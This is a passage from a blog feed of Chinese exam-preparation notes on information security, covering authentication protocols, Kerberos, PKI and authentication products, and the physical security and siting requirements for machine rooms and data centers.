class="mclose">)</span></span></span></span>﻿（B可解密）</li></ul></li></ul></li><li>密钥分发:<ul><li>A将无法解密的﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mrow><mi>P</mi><mi>B</mi></mrow></msub></mrow><annotation encoding="application/x-tex">K_{PB}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿消息转发给B</li><li>B解密获取﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mrow><mi>A</mi><mi>B</mi></mrow></msub></mrow><annotation encoding="application/x-tex">K_{AB}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li></ul></li><li>挑战响应:<ul><li>B→A: 发送﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mrow><mi>A</mi><mi>B</mi></mrow></msub><mo stretchy="false">(</mo><mi>I</mi><msub><mi>D</mi><mi>A</mi></msub><mo separator="true">,</mo><msub><mi>R</mi><mi>B</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">K_{AB}(ID_A, R_B)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li><li>A→B: 返回﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mrow><mi>A</mi><mi>B</mi></mrow></msub><mo stretchy="false">(</mo><mi>I</mi><msub><mi>D</mi><mi>B</mi></msub><mo separator="true">,</mo><msub><mi>R</mi><mi>B</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">K_{AB}(ID_B, R_B)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>﻿验证</li></ul></li></ul></li><li><p>安全机制</p><ul><li>随机数作用:﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>A</mi></msub></mrow><annotation encoding="application/x-tex">R_A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿和﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>B</mi></msub></mrow><annotation encoding="application/x-tex">R_B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿防止重放攻击</li><li>密钥保护: 通过多步骤验证确保﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mrow><mi>A</mi><mi>B</mi></mrow></msub></mrow><annotation encoding="application/x-tex">K_{AB}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿传输安全</li><li>复杂度原因: 额外步骤用于增强安全性，避免密钥直接暴露</li></ul></li></ul></li><li><p>认证机制分类：</p><ul><li>组成要素：<ul><li>验证对象: 需要被鉴别的实体（声称者）</li><li>认证协议: 信息交换规则</li><li>鉴别实体: 验证身份真实性的判断方</li></ul></li><li>分类体系<ul><li>按认证凭据<ul><li>单因素认证: 单一验证方式</li><li>双因素认证: 两种验证方式组合</li><li>多因素认证: 多种验证方式叠加</li></ul></li><li>按角色关系<ul><li>单向认证: 仅单方验证（如服务端验证客户端）</li><li>双向认证: 双方互相验证</li><li>第三方认证: 引入TTP的复杂验证</li></ul></li><li>按时间维度<ul><li>一次性口令(OTP):<ul><li>特点：防止口令重用</li><li>实例：短信验证码、S/Key口令</li></ul></li><li>持续认证:<ul><li>特征：会话全过程验证</li><li>认证因素：<ul><li>认知因素：操作习惯、交互模式</li><li>物理因素：生物特征、设备特性</li></ul></li></ul></li></ul></li></ul></li></ul></li></ul><h3 id="认证技术方法">认证技术方法</h3><ul><li>口令认证技术：基于用户所知道的秘密进行的认证技术<ul><li>优点：简单、易于实现</li><li>缺点：容易受到攻击，主要的攻击方法有<strong>窃听、重放、中间人攻击、口令猜测</strong>等</li><li>安全措施：<ul><li>安全加密存储</li><li>安全传输</li><li>认证协议要抵抗攻击，符合安全协议涉及要求</li><li>避免弱口令，遵循口令生成安全策略</li></ul></li></ul></li><li>智能卡技术：一种带有智能存储器和微处理器的集成电路卡（身份证、银行卡、校园卡等）</li><li>生物特征认证技术：指纹、虹膜等</li></ul><h3 id="kerberos认证协议">Kerberos认证协议</h3><p><img src="https://image.icewindy.cn/2025/08/b293e50c9e51700b810d08496e9b1ea4.png" alt="image-20250804173040231"></p><ul><li>四个基本实体<ul><li>Kerberos客户机</li><li>应用服务器（Application Server），为用户提供服务的设备或系统</li><li><strong>AS（Authentication Server认证服务器）</strong>，识别用户身份并提供TGS会话密钥</li><li><strong>TGS（Ticket Granting Server票据发放服务器）</strong>，为申请服务的用户提供票据（Ticket）</li></ul></li><li>核心组件：<strong>KDC（Key Distribution Center密钥分发中心）</strong></li><li><strong>KDC</strong>：<ul><li>双重架构<ul><li>AS：负责初始身份认证</li><li>TGS：负责服务授权</li></ul></li><li>核心功能：同时完成用户身份验证和服务权限分配</li><li>对比PKI：与PKI体系的CA/RA有本质区别，KDC不涉及证书管理</li></ul></li><li>认证服务器（AS）的功能<ul><li>主要职责：<ul><li>验证用户身份真实性</li><li>生成TGS会话密钥</li><li>发放初始票据（TGT）</li></ul></li><li>工作特点：仅完成身份核验，不涉及具体服务授权</li></ul></li><li>票据发放服务器（TGS）的功能<ul><li>核心作用：<ul><li>验证AS发放的票据有效性</li><li>根据权限发放服务票据</li><li>实现细粒度访问控制（如区分领导/员工权限）</li></ul></li><li>授权机制：通过票据实现&quot;安全传递用户身份信息集合&quot;</li></ul></li><li>票据（Ticket）的作用与内容<ul><li>核心功能：安全传递用户身份凭证</li><li>关键字段：客户方实体名称、地址、时间戳、票据有效期、会话密钥</li><li>对比证书：<ul><li>票据侧重短期身份凭证</li><li>证书包含公钥和CA签名等长期凭证</li><li>二者常混合考察（考试重点）</li></ul></li></ul></li><li>Kerberos认证协议优缺点<ul><li>优点<ul><li>减少密钥暴露：通过票据机制显著减少用户密钥的密文暴露次数，后续认证无需重复使用密钥，有效降低攻击者积累密文的机会。</li><li>单点登录实现：用户只需获取一次票据（未过期状态下）即可访问多个服务器系统，典型应用场景如企业多业务系统（邮件、CRM、文件系统等），避免重复输入密码。</li></ul></li><li>缺点<ul><li>时间同步要求：所有主机节点必须解决时间同步问题，否则会影响票据有效性验证。</li><li>抗DoS攻击缺陷：协议本身无法抵御拒绝服务攻击（DoS），需依赖主机节点额外部署防御措施。</li></ul></li></ul></li></ul><h3 id="pki体系">PKI体系</h3><img src="https://image.icewindy.cn/2025/08/14a57f1f0316ff6a4a884759160cd945.png" alt="image-20250804185519000" style="zoom:50%;" /><ul><li>核心组件：<ul><li>RA（注册机构）</li><li>CA（证书颁发机构）</li><li>CRL（证书吊销列表库）</li></ul></li><li>证书内容：<ul><li>用户公钥</li><li>CA数字签名</li><li>版本号等元数据</li></ul></li><li>对比Kerberos：<ul><li>PKI使用证书而非票据</li><li>包含完整的证书生命周期管理</li><li>考试中需严格区分两种体系</li></ul></li></ul><h3 id="其他认证技术">其他认证技术</h3><p><img src="https://image.icewindy.cn/2025/08/3443b807cbc69aec019ed7463922558d.png" alt="image-20250804185348774"></p><ul><li>人机识别认证：利用计算机求解问题的困难性区分人机操作（如图形验证码），典型案例为12306的图片识别验证。</li><li>多因素认证：组合多种认证因子（如密码+生物特征）提升安全性。</li><li>FIDO快速认证：<ul><li>技术原理：采用公钥加密技术（私钥存储在用户设备如硬件令牌中），公钥注册到在线服务。</li><li>应用场景：公安移动警务通等设备内置私钥实现快速认证，避免频繁输入密码。</li><li>安全特性：私钥及本地认证信息永不离开设备，符合高安全要求。</li></ul></li></ul><h2 id="认证主要产品与应用">认证主要产品与应用</h2><h3 id="主要产品">主要产品</h3><img src="https://image.icewindy.cn/2025/08/4c18cec1851b236937a917429ab0bf31.png" alt="image-20250804190800790" style="zoom:50%;" /><ul><li>产品形态：硬件实体模式（如认证网关）、软件模式（认证软件）和软硬结合模式（后台软件系统+前端硬件设备）</li><li>系统安全增强：U盘+口令、智能卡+口令、生物信息+口令等组合认证方式，应用场景包括U盘登录计算机、网银U盾认证、指纹登录系统等</li><li>生物认证：人证核验智能终端（如酒店身份核验）、指纹U盘、人脸识别门禁、指纹采集仪等硬件设备</li><li>电子认证服务：基于数字证书的系统，如CA机构颁发的个人/企业证书、SSL证书、时间戳服务平台等</li><li>网络准入控制：采用802.1X、Radius、VPN等技术，与网络设备联动验证入网设备合规性（如企业WiFi认证）</li><li>身份认证网关：利用数字证书等技术建立认证中心，提供单点登录、安全审计等服务（如FTP服务器访问控制）</li></ul><h3 id="产品主要的技术指标">产品主要的技术指标</h3><ul><li>算法支持：依赖密码技术，支持﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mi>E</mi><mi>S</mi><mi mathvariant="normal">/</mi><mn>3</mn><mi>D</mi><mi>E</mi><mi>S</mi></mrow><annotation encoding="application/x-tex">DES/3DES</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord">/</span><span class="mord">3</span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span></span></span></span>﻿、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>E</mi><mi>S</mi></mrow><annotation encoding="application/x-tex">AES</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span></span></span></span>﻿、﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>H</mi><mi>A</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">SHA-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>﻿、﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mi>S</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">RSA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span></span></span></span>﻿、﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>M</mi><mn>1</mn><mi mathvariant="normal">/</mi><mi>S</mi><mi>M</mi><mn>2</mn><mi mathvariant="normal">/</mi><mi>S</mi><mi>M</mi><mn>3</mn><mi mathvariant="normal">/</mi><mi>S</mi><mi>M</mi><mn>4</mn></mrow><annotation encoding="application/x-tex">SM1/SM2/SM3/SM4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord">1</span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord">2</span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord">3</span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord">4</span></span></span></span>﻿等国密算法</li><li>认证准确性：包含认假率（错误接受非授权用户）和拒真率（错误拒绝合法用户），特别适用于生物识别场景</li><li>用户承载量：系统最大支持并发用户数</li><li>安全保障级别：评估产品的抗攻击能力、可靠性和安全措施完善程度</li><li>技术实现差异：家用网络采用PPPoE认证，企业用802.1X，公共场所使用网页认证，体现不同场景的技术选型</li></ul>]]></content>
      
      
      <categories>
          
          <category> 软考 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全工程师软考（5）：物理安全</title>
      <link href="/2025/08/01/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%885%EF%BC%89%EF%BC%9A%E7%89%A9%E7%90%86%E5%AE%89%E5%85%A8/"/>
      <url>/2025/08/01/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%885%EF%BC%89%EF%BC%9A%E7%89%A9%E7%90%86%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="物理安全概述">物理安全概述</h2><h3 id="物理安全概念">物理安全概念</h3><ul><li>传统定义：涵盖<strong>环境、设备和记录介质</strong>等支持网络信息系统运行硬件的总体安全</li><li>广义定义：包含<strong>硬件、软件、操作人员及环境</strong>组成的人-机-物融合系统的安全</li><li>威胁分类：<ul><li>自然威胁：地震/洪水/雷电/鼠害等</li><li>人为威胁：盗窃/爆炸/硬件攻击等</li></ul></li></ul><h4 id="物理安全威胁">物理安全威胁</h4><ul><li>硬件木马<ul><li>植入方式：在IC芯片中嵌入<strong>恶意电路</strong>，激活后改变原有功能</li><li>攻击阶段：<ul><li>研发设计：通过EDA工具/IP核植入</li><li>生产制造：代工厂逆向工程植入</li><li>封装测试：测试环节恶意篡改</li><li>应用阶段</li></ul></li><li>国产化意义：避免供应链不可控导致的安全隐患，国产化全环节可控</li></ul></li><li>硬件协同的恶意代码<ul><li>攻击特征：非授权软件访问特权内存区域（破坏了机密性）</li><li>破坏目标：主要破坏信息安全的机密性属性</li></ul></li><li>硬件安全漏洞利用<ul><li>典型漏洞：<ul><li>熔断(Meltdown)：允许越权读取内核内存</li><li>幽灵(Spectre)：用于以侧信道方式获取指令预存、预执行对cache的影响等信息，进而获取到特定代码、数据在内存中的位置信息，从而利用其他漏洞对改内存进行读取或篡改</li></ul></li><li>修复难点：硬件漏洞无法通过补丁完全修复，可能需整批设备淘汰</li></ul></li><li>基于软件漏洞攻击硬件实体<ul><li>攻击链条：软件漏洞→参数篡改→物理损坏</li><li>震网病毒案例：通过控制软件超频离心机转速导致设备物理损毁</li></ul></li><li>基于环境攻击计算机实体<ul><li>攻击媒介：电磁波/磁场/温湿度等环境参数</li><li>防护措施：电磁屏蔽机房、恒温恒湿控制系统</li></ul></li></ul><h4 id="物理安全保护">物理安全保护</h4><ul><li><p>设备物理安全</p><ul><li>标识管理：设备标签/网线标记（防止误接关键设备）</li><li>电磁防护：光纤/屏蔽网线/屏蔽机房三级防护</li><li>电源保护：UPS防止瞬间断电损坏设备</li><li>抗震设计：防静电地板+槽钢固定机柜</li></ul></li><li><p>嵌入软件：智能设备要确保嵌入的软件是安全可信</p></li><li><p>环境物理安全</p><ul><li>选址要点：<ul><li>电力供应：多路供电+柴油发电机</li><li>地理安全：避开地震/洪水多发区</li><li>气候适宜：优先选择内蒙/贵州等温带地区</li></ul></li><li>基础防护：防火/防水/防雷/防鼠/门禁系统</li></ul></li><li><p>系统物理安全</p><ul><li>介质管理：涉密存储介质加密处理</li><li>访问控制：机房分级门禁+机柜物理锁</li><li>灾备方案：异地容灾备份系统</li></ul></li><li><p>物理安全保护方法：安全合规、访问控制、安全屏蔽、故障容错、安全监测与预警、供应链安全管理和容灾备份</p></li></ul><h3 id="物理安全分析与防护">物理安全分析与防护</h3><p><img src="https://image.icewindy.cn/2025/08/5dbfa02535c0c80f1edb4f489310b41e.png" alt="image-20250801153338210"></p><p><img src="https://image.icewindy.cn/2025/08/1d7e1fdc3e620fdd00e95c410c67f10a.png" alt="image-20250801153753299"></p><h2 id="机房安全与防护">机房安全与防护</h2><h3 id="机房功能分区">机房功能分区</h3><p><img src="https://image.icewindy.cn/2025/08/1a1fda857c0389c5be9424bf4684cab8.png" alt="image-20250801154123828"></p><ul><li>主要工作间：主机房、终端室等<strong>核心操作区域</strong>，如放置服务器集群的空间</li><li>第一类辅助间：低压配电间、UPS室、蓄电池室、空调机房等<strong>设备支持区域</strong>，图中展示的蓄电池架和空调机组属于此类</li><li>第二类辅助间：资料室（含文件柜）、维修室、技术人员办公室等<strong>管理区域</strong></li><li>第三类辅助间：储藏室、缓冲间、休息室等<strong>次要空间</strong>，实际机房中较少设置盥洗室</li><li>特殊说明：允许<strong>一室多用或根据实际情况增减房间</strong>，考试需注意维修室属于第二类而非主要工作间</li></ul><h3 id="机房场地选择要求">机房场地选择要求</h3><h4 id="机房等级划分">机房等级划分</h4><p><img src="https://image.icewindy.cn/2025/08/c44ae0417ef89dae3c40af445352fe2c.png" alt="image-20250801154441745"></p><ul><li>A级标准：系统中断将严重危害国家安全/社会秩序/公共利益，需最严格防护措施（如带附加要求的电磁干扰防护）</li><li>B级标准：系统中断造成较大损害，要求较完善防护（如基础防火要求）</li><li>C级标准：无特殊影响场景，仅需基本防护（灭火器等基础配置）</li><li>混合执行：允许项目采用不同级别，例如电磁干扰按A级，火灾报警按C级</li></ul><h4 id="环境安全性要求">环境安全性要求</h4><ul><li>危险源规避：远离油库、煤气站等易燃易爆场所（最小水平间距建议200米）</li><li>污染区规避：避开化工厂、水泥厂等粉尘/有毒气体污染源</li><li>盐雾防护：特别禁止沿海区域和产盐区（腐蚀性水蒸气会损坏金属设备）</li><li>雷击防护：需进行雷击风险评估，避免高频落雷区域</li></ul><h4 id="地质可靠性要求">地质可靠性要求</h4><ul><li>基础地质：禁止建设在杂填土、流沙层等不稳定地基上</li><li>山区选址：需避开滑坡体、溶洞等地质灾害频发区</li><li>矿区限制：距离采矿崩落区至少500米，且避开待开采矿脉</li><li>湿度控制：禁止低洼地带（防洪要求）和地下水位过高区域</li></ul><h4 id="场地抗电磁干扰性要求">场地抗电磁干扰性要求</h4><ul><li>射频干扰：与广播塔、雷达站保持至少1km间距（发射功率&gt;100kW时）</li><li>规范限值：按GB/T2887-2011要求，0.15-1000MHz频段干扰≤126dBμV，磁场强度≤800A/m</li><li>强电流设备：距电气化铁路、高压线（220kV以上）需200米以上</li><li>特殊设备：高频炉、大功率电机等应设置独立屏蔽间</li></ul><h4 id="避开强振动源和强噪声源">避开强振动源和强噪声源</h4><ul><li>机械振动：冲床、锻压设备等需设置减震基础或保持300米间距</li><li>交通振动：避开机场跑道3km范围内，距主干道≥50米</li><li>建筑布局：窗户避免临街设计，采用双层隔音玻璃</li></ul><h4 id="机房建筑位置选择">机房建筑位置选择</h4><ul><li>优选楼层：独立建筑、用大楼二层（一层作为动力、配电、空调间等）</li><li>承重考虑：电池组等重型设备（&gt;500kg/m²）应布置在加固楼板区域</li><li>防水要求：严禁设置在卫生间下层或同层相邻位置</li><li><strong>关键要素</strong>：必须确保电力水源充足、环境清洁、交通和通信方便</li><li>保密要求：机要部门需采用屏蔽机房（射频泄漏衰减≥60dB）</li></ul><h3 id="数据中心建设与设计要求">数据中心建设与设计要求</h3><h4 id="定义">定义</h4><ul><li>核心定义：实现对数据信息的<strong>集中处理、存储、传输、交换、管理</strong>，并为相关电子信息设备提供运行环境的建筑场所</li><li>与机房关系：本质上是&quot;大机房&quot;或&quot;高级机房&quot;。</li></ul><h4 id="分类">分类</h4><ul><li>超大型：标准机柜&gt;10000个</li><li>大型：3000﻿&lt;﻿机柜&lt;﻿10000个</li><li>中小型：机柜&lt;﻿3000﻿个</li></ul><h4 id="超大型数据中心的建设考虑">超大型数据中心的建设考虑</h4><ul><li>选址要素：优先考虑气候寒冷/适宜、能源充足的一二类地区</li><li>应用特点：以灾备等实时性要求不高的应用为主（原教材&quot;事实性&quot;为错误表述）</li><li>典型案例：运营商和互联网企业建设的国家级数据中心</li></ul><h4 id="大型数据中心的建设考虑">大型数据中心的建设考虑</h4><ul><li>建设原则：鼓励在一二类地区建设，三类地区需靠近能源富集区</li><li>能源需求：需重点评估气候环境和能源供给稳定性</li><li>规模感知：3000个机柜实际可承载约3万台服务器（按每柜10台估算）</li></ul><h4 id="中小型数据中心的建设考虑">中小型数据中心的建设考虑</h4><ul><li>核心驱动：以市场需求为主导，能源因素次之</li><li>部署特点：靠近用户侧（如电子政务云）、能源获取便利区域</li><li>项目特征：投资规模多在千万级别（例如8000万项目对应约100机柜）</li></ul><h3 id="数据中心等级与规范">数据中心等级与规范</h3><ul><li>A级标准：<ul><li>电子信息系统中断将造成重大经济损失</li><li>或导致公共场所秩序严重混乱（如金融、医疗核心系统）</li></ul></li><li>B级标准：<ul><li>系统中断造成较大经济损失</li><li>或引发公共场所秩序混乱</li></ul></li><li>C级标准：不属于上述两类的一般性数据中心</li></ul><h3 id="数据中心强制规范">数据中心强制规范</h3><ul><li>等电位联结要求：所有设备的金属外壳、金属管道、金属线槽（如综合布线桥架）、建筑物金属结构必须进行<strong>等电位联结并接地</strong>。</li><li>耐火等级：数据中心<strong>耐火等级不应低于二级</strong>；与其他功能用房同建筑时，需用耐火极限≥2.0h的防火隔墙和1.5h楼板隔开，门采用<strong>甲级防火门</strong>。</li><li>灭火系统配置：<ul><li>管网式气体灭火或细水雾系统需设置两组独立火灾探测器（冗余设计）</li><li><strong>火灾报警系统需与灭火系统、视频监控系统联动</strong></li><li>气体灭火机房必须配置<strong>专用空气呼吸器/氧气呼吸器</strong>（防止<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><msub><mi>O</mi><mn>2</mn></msub></mrow><annotation 